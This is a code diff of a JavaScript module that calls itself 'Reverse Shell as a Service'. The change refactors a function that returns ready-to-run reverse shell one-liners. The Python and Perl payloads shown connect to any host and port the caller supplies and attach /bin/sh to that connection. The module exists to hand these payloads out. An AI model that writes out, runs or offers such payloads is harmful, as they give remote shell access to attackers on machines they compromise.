@@ -11,7 +11,11 @@ const usage = `# Reverse Shell as a Service
 #
 # 3. Don't be a dick`;
 
-const generateScript = (host, port) => {
+const reverseShell = (host, port) => {
+	if (!host || !port) {
+		return usage;
+	}
+
 	const payloads = {
 		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
 		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
@@ -28,12 +32,7 @@ if command -v ${cmd} > /dev/null 2>&1; then
 fi`;
 
 		return script;
-	}, '');
-};
-
-const reverseShell = req => {
-	const [host, port] = req.url.substr(1).split(':');
-	return usage + (host && port && generateScript(host, port));
+	}, usage);
 };
 
 module.exports = reverseShell;
